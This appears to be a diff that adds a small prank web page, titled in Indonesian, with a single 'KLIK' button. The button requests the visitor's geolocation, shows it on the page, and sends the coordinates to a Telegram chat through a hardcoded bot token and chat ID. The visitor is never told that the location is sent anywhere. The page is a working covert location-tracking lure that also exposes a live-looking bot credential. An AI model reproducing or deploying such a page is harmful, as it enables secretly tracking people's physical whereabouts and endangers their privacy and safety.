@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+</head>
+<body>
+
+<h1>KLIK HUSNUL 🤣</h1>
+
+<button onclick="getLocation()">KLIK</button>
+
+<p id="lokasi"></p>
+
+<script>
+function getLocation() {
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(showPosition, showError);
+  } else {
+    document.getElementById("lokasi").innerHTML = "Geolocation tidak didukung oleh browser ini.";
+  }
+}
+
+function showPosition(position) {
+  var latitude = position.coords.latitude;
+  var longitude = position.coords.longitude;
+  var pesan = "Lokasi: " + latitude + ", " + longitude;
+  document.getElementById("lokasi").innerHTML = pesan;
+
+  // Kirim lokasi ke Telegram
+  kirimKeTelegram(pesan);
+}
+
+function showError(error) {
+  switch(error.code) {
+    case error.PERMISSION_DENIED:
+      document.getElementById("lokasi").innerHTML = "Pengguna menolak permintaan Geolocation.";
+      break;
+    case error.POSITION_UNAVAILABLE:
+      document.getElementById("lokasi").innerHTML = "Informasi lokasi tidak tersedia.";
+      break;
+    case error.TIMEOUT:
+      document.getElementById("lokasi").innerHTML = "Permintaan waktu pengguna untuk mendapatkan lokasi telah habis.";
+      break;
+    case error.UNKNOWN_ERROR:
+      document.getElementById("lokasi").innerHTML = "Terjadi kesalahan yang tidak diketahui.";
+      break;
+  }
+}
+
+function kirimKeTelegram(pesan) {
+  // Ganti TOKEN_BOT dan CHAT_ID dengan nilai yang sesuai
+  var tokenBot = "7863353249:AAGeLK7vgDRaqXrdL6dLLSmogSyySPjda7k";
+  var chatId = "-4634384561";
+  var url = "https://api.telegram.org/bot" + tokenBot + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(pesan);
+
+  // Gunakan XMLHttpRequest atau fetch untuk mengirim permintaan ke Telegram API
+  var xhr = new XMLHttpRequest();
+  xhr.open("GET", url);
+  xhr.send();
+}
+</script>
+
+</body>
+</html>
